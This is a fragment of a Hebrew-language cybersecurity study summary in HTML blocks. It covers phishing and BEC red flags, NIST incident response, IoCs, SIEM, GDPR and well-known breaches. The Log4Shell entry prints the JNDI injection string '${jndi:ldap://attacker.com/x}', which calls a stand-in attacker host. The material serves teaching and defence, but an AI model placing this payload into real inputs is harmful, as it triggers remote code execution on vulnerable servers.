<div class="sum-row"><span class="sum-k">BEC — הונאת אימייל עסקי</span><span class="sum-v">Business Email Compromise: תוקף פרץ לאימייל של CEO. שולח ל-CFO: "דחוף! עסקה סגורה בסוד, העבר $3M לחשבון הזה תוך שעה." CFO מעביר. כסף נגנב. <strong>$26 מיליארד</strong> הפסד גלובלי שנתי. SPF+DKIM+DMARC: אימות שאימייל אכן בא מה-domain האמיתי. עדיין לא מגן על account שנפרץ.</span></div>
<div class="sum-row"><span class="sum-k">Red Flags לזיהוי</span><span class="sum-v">⏰ <strong>דחיפות מלאכותית</strong>: "חייב עכשיו!". 🔗 <strong>URL חשוד</strong>: paypa1.com, googIe.com (I ≠ l). 📎 <strong>Attachment לא מצופה</strong>: "קובץ מצורף חשוב". 💰 <strong>בקשה חריגה</strong>: "העבר כסף/שנה פרטי בנק". 📧 <strong>Email domain שונה</strong> מSender name. כלל: אם משהו מרגיש "מהיר מדי" — עצור, בדוק בערוץ נפרד.</span></div>
<div class="sum-row"><span class="sum-k">הגנה</span><span class="sum-v">Security Awareness Training: הדרכות תקופתיות. Phishing Simulations: שלח phishing מזויף לעובדים — מי לחץ? הדרך ל-MFA: גם אם credentials נגנבו, לא יכולים להיכנס. DMARC: מונע זיוף domain. Verification protocol: העברת כסף/שינוי פרטים = אימות בטלפון לא בEmail.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">🚨 תגובה לאירועים — מה עושים כשנפרצים</div>
<div class="sum-row"><span class="sum-k">ה-6 שלבי IR (NIST)</span><span class="sum-v"><strong>1 Preparation</strong>: לפני שקורה — כתוב תוכנית, הכשר צוות, התקן כלים. <strong>2 Detection</strong>: זהה שמשהו קרה (SIEM, IDS, user report). <strong>3 Containment</strong>: בלום — נתק network segment נפרץ. <strong>4 Eradication</strong>: הסר גורם — מחק malware, סגור backdoor. <strong>5 Recovery</strong>: חזור לפעולה מגיבוי נקי. <strong>6 Lessons Learned</strong>: מה נכשל? תקן. MTTD ממוצע עולמי: <strong>207 ימים</strong> לגלות פריצה.</span></div>
<div class="sum-row"><span class="sum-k">IoC — Indicators of Compromise</span><span class="sum-v">ראיות שמשהו קרה: IP זדוני שנראה בlogs, hash של קובץ malware, שינוי registry key חשוד, domain של C2 server. VirusTotal: העלה קובץ → 80 antivirus engines בודקים. AlienVault OTX: מאגר IoCs ציבורי חינמי. MISP: פלטפורמת שיתוף IoCs בין ארגונים. מצא IoC אחד → חפש אותו בכל ה-logs.</span></div>
<div class="sum-row"><span class="sum-k">Digital Forensics — שחזור מה קרה</span><span class="sum-v">כלל ראשון: <strong>אל תשנה evidence</strong>. צלם memory dump לפני shutdown. צלם disk image. Chain of custody: תעד מי נגע במה ומתי. Timeline Analysis: מה קרה ראשון → מה אחר כך. Artifacts ב-Windows: Event Logs, Prefetch, $MFT, Registry, Browser History. כמו CSI למחשב.</span></div>
<div class="sum-row"><span class="sum-k">SIEM — מרכז השליטה</span><span class="sum-v">Security Information and Event Management: מקבל logs מ<strong>כל המערכות</strong> — firewall, servers, endpoints, cloud. מחפש <strong>correlations</strong>: "login נכשל 50 פעמים ב-30 שניות → brute force alert". Splunk, Microsoft Sentinel, Elastic SIEM. SOAR: גרסה אוטומטית — מגלה → מנתח → מגיב אוטומטית (מבלוק IP, שולח alert לSlack).</span></div>
<div class="sum-tip">💡 <strong>Assume Breach Mentality</strong>: אל תניח שלא ייפרצו — ניחש שכבר נפרצו ולא מצאת. תשאל: "אם תוקף כבר בפנים — מה יש לו גישה אליו? מה אנחנו מגנים?" זה משנה לחלוטין את גישת האבטחה.</div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">📋 רגולציה — כללי המשחק הגלובלי</div>
<div class="sum-row"><span class="sum-k">GDPR — מה זה ולמה חשוב</span><span class="sum-v">General Data Protection Regulation: חוק ה-EU מ-2018 שמגן על פרטיות אזרחי אירופה. חל על <strong>כל ארגון בעולם</strong> שמעבד נתוני EU — גם startup ישראלי שיש לו לקוחות בגרמניה. קנס: עד €20M <strong>או</strong> 4% מהמחזור הגלובלי — כל שגדול יותר. British Airways: £20M. WhatsApp: €225M. GDPR שינה כיצד כל העולם מתייחס לdata.</span></div>
<div class="sum-row"><span class="sum-k">7 עקרונות GDPR</span><span class="sum-v"><strong>Lawfulness</strong>: יש לך basis לעבד? (הסכמה, חוזה, אינטרס לגיטימי). <strong>Purpose Limitation</strong>: אסוף רק למטרה שהגדרת. <strong>Data Minimization</strong>: רק מה שנחוץ. <strong>Accuracy</strong>: מידע עדכני. <strong>Storage Limitation</strong>: מחק כשלא צריך. <strong>Security</strong>: הגן. <strong>Accountability</strong>: תוכל להוכיח שעמדת בכל האחרים.</span></div>
<div class="sum-row"><span class="sum-k">זכויות הנושא</span><span class="sum-v">כל אדם שיש לו data אצלך: <strong>Right to Access</strong> (תן לי את כל ה-data שלי). <strong>Right to Erasure</strong> ("שכח ממני" — מחק הכל). <strong>Right to Portability</strong> (תן לי ה-data שלי בפורמט שאוכל לקחת לשירות אחר). <strong>Right to Object</strong> (הפסק לעבד). חייבים לענות תוך <strong>30 ימים</strong>.</span></div>
<div class="sum-row"><span class="sum-k">Breach Notification</span><span class="sum-v">היה breach? חייבים לדווח ל-DPA (Data Protection Authority) תוך <strong>72 שעות</strong> מגילוי. אם הbreach מסכן אנשים — דווח גם להם ישירות. כנות ומהירות = קנסות נמוכים יותר. ניסיון להסתיר = קנסות מקסימליים + reputation damage.</span></div>
<div class="sum-row"><span class="sum-k">תקנים נוספים</span><span class="sum-v"><strong>ISO 27001</strong>: certification לניהול אבטחה (ISMS). <strong>PCI DSS</strong>: כרטיסי אשראי — חובה לכל מי שמעבד payments. <strong>HIPAA</strong>: medical data בארה"ב. <strong>SOC 2</strong>: SaaS vendors שמאחסנים data של לקוחות. בישראל: תקנות הגנת הפרטיות (ILPA) + הנחיות רמ"א (ממשל). כל sector = תקן אחר.</span></div>
</div>`,
`<div class="sum-block"><div class="sum-block-title">💀 שגיאות אמיתיות — מה יכולנו ללמוד</div>
<div class="sum-row"><span class="sum-k">Equifax 2017 — patch שלא בוצע</span><span class="sum-v">Equifax = חברת אשראי שיודעת <em>הכל</em> על 820M איש. אפריל 2017: פורסם CVE חמור ב-Apache Struts. <strong>Equifax לא עדכנה 2 חודשים</strong>. מאי: תוקפים נכנסו. ספטמבר: גילוי. 147M אמריקאים — SSN, תאריך לידה, כתובת — חשופים. עלות: $575M. מנכ"ל התפטר. לקח: <strong>Patch Management = תהליך, לא מחשבה אחרת</strong>.</span></div>
<div class="sum-row"><span class="sum-k">SolarWinds 2020 — Supply Chain Attack</span><span class="sum-v">SolarWinds = תוכנת ניהול רשת בשימוש 33,000 ארגונים. האקרים רוסים (APT29) הכניסו malware (<strong>SUNBURST</strong>) ל<strong>עדכון לגיטימי</strong> של התוכנה. 18,000 ארגונים הורידו ה-"עדכון". NSA, Microsoft, FireEye, מחלקת האוצר האמריקאית — נפרצו. גילוי: <strong>9 חודשים אחרי</strong>. לקח: אל תאמין לupdate — verify.</span></div>
<div class="sum-row"><span class="sum-k">Colonial Pipeline 2021 — VPN ללא MFA</span><span class="sum-v">Colonial = pipeline גדולה שמספקת 45% מדלק החוף המזרחי. DarkSide ransomware נכנס דרך <strong>VPN account ישן עם סיסמה שדלפה ב-Dark Web, ללא MFA</strong>. Pipeline כובתה 5 ימים. תורים בתחנות דלק. $4.4M ransom שולם. FBI החזיר $2.3M. לקח: <strong>MFA לכל דבר. לכל דבר. לכל דבר.</strong></span></div>
<div class="sum-row"><span class="sum-k">Log4Shell 2021 — library שכולם שכחו</span><span class="sum-v">Log4j = library Java לlogging — קיימת מ-2001, משובצת ב<strong>כל מקום</strong>. דצמבר 2021: נמצא שאפשר להזין <code>$\{jndi:ldap://attacker.com/x}</code> בכל שדה text שנלוג → RCE. <strong>CVSS 10.0</strong>. כל שרת עם Log4j גרסה מסוימת = vulnerable. iClouds Apple, Minecraft, Tesla, NASA. שבועיים של מרוץ global patching. לקח: דע מה libraries אתה משתמש (SBOM).</span></div>
<div class="sum-row"><span class="sum-k">הדפוס החוזר — ו-2025</span><span class="sum-v">כל ה-breaches הגדולים חולקים: ✖ Patch ידוע שלא יושם ✖ ללא MFA ✖ ללא network segmentation ✖ גילוי מאוחר מדי. אין excuses לאלה ב-2025. Tools: Shodan לגלות exposure. HaveIBeenPwned לסיסמאות דלופות. VirusTotal לfiles. NIST CSF לmframework. <strong>Security = process, לא מוצר.</strong></span></div>
</div>`
